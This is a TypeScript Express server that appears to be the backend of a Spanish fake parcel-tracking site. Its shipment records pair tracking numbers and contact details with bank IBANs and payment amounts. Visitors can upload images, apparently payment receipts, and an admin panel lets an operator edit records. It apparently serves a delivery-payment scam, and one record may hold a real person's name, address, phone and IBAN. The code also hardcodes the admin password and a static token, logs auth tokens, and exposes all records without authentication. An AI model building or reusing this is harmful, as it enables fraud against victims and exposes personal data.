import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const PORT = Number(process.env.PORT) || 3000;

// Increase payload size for base64 images
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const currentDir = process.cwd();
const UPLOADS_FILE = path.join(currentDir, 'uploads.json');
const SHIPMENT_FILE = path.join(currentDir, 'shipments.json');

const DEFAULT_SHIPMENTS = [
  {
    id: "1",
    trackingNumber: "6635471299413458",
    name: "Nicola Tella",
    postalCode: "50001, Zaragoza",
    address: "Ps. Independencia 33, 50001, Zaragoza",
    contact: "+34 614 11 39 38",
    packageVerified: "Cable USB",
    beneficiary: "5728",
    concept: "Pago 5728",
    ibanLabel: "IBAN BANCO (BBVA)",
    ibanValue: "ES74 0182 2647 5902 0168 2392",
    shippingCost: "14,58€ (PAGADO)",
    packageCost: "4,00€",
    totalAmount: "4,00€",
    status: "pending",
    badge: "EN TRÁNSITO"
  },
  {
    id: "2",
    trackingNumber: "6635471299413460",
    name: "Juan Pérez",
    postalCode: "28001, Madrid",
    address: "Calle Mayor 1, 28001, Madrid",
    contact: "+34 600 00 00 00",
    packageVerified: "Documentos",
    beneficiary: "1234",
    concept: "Envío 1234",
    ibanLabel: "IBAN BANCO (SANTANDER)",
    ibanValue: "ES12 3456 7890 1234 5678 9012",
    shippingCost: "10,00€ (PAGADO)",
    packageCost: "0,00€",
    totalAmount: "0,00€",
    status: "pending",
    badge: "EN TRÁNSITO"
  },
  {
    id: "3",
    trackingNumber: "5535471299413458",
    name: "María García",
    postalCode: "08001, Barcelona",
    address: "La Rambla 10, 08001, Barcelona",
    contact: "+34 611 11 11 11",
    packageVerified: "Electrónica",
    beneficiary: "5678",
    concept: "Pedido 5678",
    ibanLabel: "IBAN BANCO (CAIXABANK)",
    ibanValue: "ES98 7654 3210 9876 5432 1098",
    shippingCost: "15,00€ (PAGADO)",
    packageCost: "5,00€",
    totalAmount: "5,00€",
    status: "pending",
    badge: "EN TRÁNSITO"
  },
  {
    id: "4",
    trackingNumber: "6635471299413111",
    name: "Carlos Ruiz",
    postalCode: "41001, Sevilla",
    address: "Avenida de la Constitución 5, 41001, Sevilla",
    contact: "+34 622 22 22 22",
    packageVerified: "Ropa",
    beneficiary: "9012",
    concept: "Compra 9012",
    ibanLabel: "IBAN BANCO (SABADELL)",
    ibanValue: "ES45 6789 0123 4567 8901 2345",
    shippingCost: "12,00€ (PAGADO)",
    packageCost: "2,00€",
    totalAmount: "2,00€",
    status: "pending",
    badge: "EN TRÁNSITO"
  }
];

// Initialize uploads file if it doesn't exist
if (!fs.existsSync(UPLOADS_FILE)) {
  fs.writeFileSync(UPLOADS_FILE, JSON.stringify([]));
}

// Initialize shipment file if it doesn't exist
if (!fs.existsSync(SHIPMENT_FILE)) {
  fs.writeFileSync(SHIPMENT_FILE, JSON.stringify(DEFAULT_SHIPMENTS));
}

// API Routes
app.get("/api/shipment", (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(SHIPMENT_FILE, 'utf-8'));
    res.json(data);
  } catch (error) {
    res.json(DEFAULT_SHIPMENTS);
  }
});

app.post("/api/admin/shipment", (req, res) => {
  const token = req.headers.authorization;
  if (token !== "Bearer admin-token-123" && token !== "admin-token-123") {
    return res.status(401).json({ error: "Unauthorized" });
  }
  
  try {
    const newShipments = req.body;
    if (!Array.isArray(newShipments)) {
      return res.status(400).json({ error: "Expected an array of shipments" });
    }
    fs.writeFileSync(SHIPMENT_FILE, JSON.stringify(newShipments, null, 2));
    res.json({ success: true });
  } catch (error) {
    console.error("Error saving shipments:", error);
    res.status(500).json({ error: "Failed to update shipments" });
  }
});

app.post("/api/admin/shipment/reset", (req, res) => {
  const token = req.headers.authorization;
  if (token !== "Bearer admin-token-123" && token !== "admin-token-123") {
    return res.status(401).json({ error: "Unauthorized" });
  }
  
  try {
    fs.writeFileSync(SHIPMENT_FILE, JSON.stringify(DEFAULT_SHIPMENTS, null, 2));
    res.json({ success: true, data: DEFAULT_SHIPMENTS });
  } catch (error) {
    res.status(500).json({ error: "Failed to reset shipments" });
  }
});

// Legacy status endpoint (returns status of the first shipment for backward compatibility)
app.get("/api/status", (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(SHIPMENT_FILE, 'utf-8'));
    res.json({ status: data[0]?.status || 'pending' });
  } catch (error) {
    res.json({ status: 'pending' });
  }
});

app.post("/api/uploads", (req, res) => {
  try {
    const { image, trackingNumber, date } = req.body;
    if (!image) {
      return res.status(400).json({ error: "Image is required" });
    }

    let uploads = [];
    try {
      const fileContent = fs.readFileSync(UPLOADS_FILE, 'utf-8');
      if (fileContent) {
        uploads = JSON.parse(fileContent);
      }
    } catch (e) {
      console.error("Error parsing uploads.json for write:", e);
      uploads = [];
    }
    
    if (!Array.isArray(uploads)) {
      uploads = [];
    }

    const newUpload = {
      id: Date.now().toString(),
      image,
      trackingNumber: trackingNumber || "N/A",
      date: date || new Date().toISOString()
    };
    
    uploads.push(newUpload);
    fs.writeFileSync(UPLOADS_FILE, JSON.stringify(uploads));
    
    res.json({ success: true, id: newUpload.id });
  } catch (error) {
    console.error("Error saving upload:", error);
    res.status(500).json({ error: "Failed to save upload" });
  }
});

app.post("/api/admin/login", (req, res) => {
  const { password } = req.body;
  if (password === "192021") {
    res.json({ success: true, token: "admin-token-123" });
  } else {
    res.status(401).json({ error: "Contraseña incorrecta" });
  }
});

app.get("/api/admin/uploads", (req, res) => {
  const token = req.headers.authorization;
  console.log("Received token for uploads:", token);
  if (token !== "Bearer admin-token-123" && token !== "admin-token-123") {
    return res.status(401).json({ error: "Unauthorized" });
  }

  try {
    let uploads = [];
    const fileContent = fs.readFileSync(UPLOADS_FILE, 'utf-8');
    if (fileContent) {
      try {
        uploads = JSON.parse(fileContent);
      } catch (e) {
        console.error("Error parsing uploads.json:", e);
        uploads = [];
      }
    }
    
    if (!Array.isArray(uploads)) {
      uploads = [];
    }
    
    // Sort by newest first
    uploads.sort((a: any, b: any) => new Date(b.date).getTime() - new Date(a.date).getTime());
    res.json(uploads);
  } catch (error) {
    console.error("Error reading uploads:", error);
    res.status(500).json({ error: "Failed to read uploads" });
  }
});

app.delete("/api/admin/uploads/:id", (req, res) => {
  const token = req.headers.authorization;
  if (token !== "Bearer admin-token-123" && token !== "admin-token-123") {
    return res.status(401).json({ error: "Unauthorized" });
  }

  try {
    const { id } = req.params;
    let uploads = [];
    const fileContent = fs.readFileSync(UPLOADS_FILE, 'utf-8');
    if (fileContent) {
      uploads = JSON.parse(fileContent);
    }
    
    if (!Array.isArray(uploads)) uploads = [];
    
    const filteredUploads = uploads.filter((u: any) => u.id !== id);
    fs.writeFileSync(UPLOADS_FILE, JSON.stringify(filteredUploads));
    
    res.json({ success: true });
  } catch (error) {
    console.error("Error deleting upload:", error);
    res.status(500).json({ error: "Failed to delete upload" });
  }
});

async function startServer() {
  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
